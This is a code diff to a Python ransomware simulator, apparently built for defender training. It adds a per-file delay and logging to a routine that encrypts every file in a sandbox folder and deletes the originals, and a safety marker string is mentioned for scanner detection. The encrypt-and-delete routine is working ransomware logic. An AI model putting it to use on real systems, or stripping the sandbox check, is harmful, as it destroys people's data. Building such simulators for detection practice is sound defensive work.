@@ -1,5 +1,6 @@
 import os
 import sys
+import time
 from cryptography.fernet import Fernet
 
 # SAFETY MARKER — scanner/YARA will detect this string
@@ -10,11 +11,12 @@ _SKIP_EXTENSIONS = {'.exe', '.py', '.sh', '.bat', '.spec', '.pyz', '.pkg', '.so'
 class RansomwareSimulator:
     ENCRYPTED_EXT = ".encrypted"
 
-    def __init__(self, sandbox_dir: str = None):
+    def __init__(self, sandbox_dir: str = None, encrypt_delay: float = 5.0):
         base = os.path.dirname(os.path.abspath(__file__))
         self.sandbox_dir = sandbox_dir or os.path.join(base, "sandbox")
         self.key_file = os.path.join(self.sandbox_dir, ".ransom_key")
         self._key = None
+        self.encrypt_delay = encrypt_delay  # seconds between each file — slows demo for visibility
 
     def _get_or_create_key(self) -> bytes:
         if self._key is not None:
@@ -40,23 +42,31 @@ class RansomwareSimulator:
         key = self._get_or_create_key()
         fernet = Fernet(key)
 
+        files_to_encrypt = []
         for root, _, files in os.walk(self.sandbox_dir):
             for filename in files:
                 ext = os.path.splitext(filename)[1].lower()
                 if filename.endswith(self.ENCRYPTED_EXT) or filename == ".ransom_key" or ext in _SKIP_EXTENSIONS:
                     continue
                 filepath = os.path.join(root, filename)
-                if not self._is_inside_sandbox(filepath):
-                    continue
+                if self._is_inside_sandbox(filepath):
+                    files_to_encrypt.append(filepath)
 
-                with open(filepath, "rb") as f:
-                    data = f.read()
-                encrypted = fernet.encrypt(data)
+        for filepath in files_to_encrypt:
+            with open(filepath, "rb") as f:
+                data = f.read()
+            encrypted = fernet.encrypt(data)
 
-                enc_path = filepath + self.ENCRYPTED_EXT
-                with open(enc_path, "wb") as f:
-                    f.write(encrypted)
-                os.remove(filepath)
+            enc_path = filepath + self.ENCRYPTED_EXT
+            with open(enc_path, "wb") as f:
+                f.write(encrypted)
+            os.remove(filepath)
+
+            print(f"[SIMULATOR] Encrypted: {os.path.basename(filepath)}")
+
+            # Delay between each file so the defender GUI can detect and respond visually
+            if self.encrypt_delay > 0:
+                time.sleep(self.encrypt_delay)
 
         print(f"[SIMULATOR] {SIMULATOR_SIGNATURE}")
         print(f"[SIMULATOR] Files encrypted in: {self.sandbox_dir}")
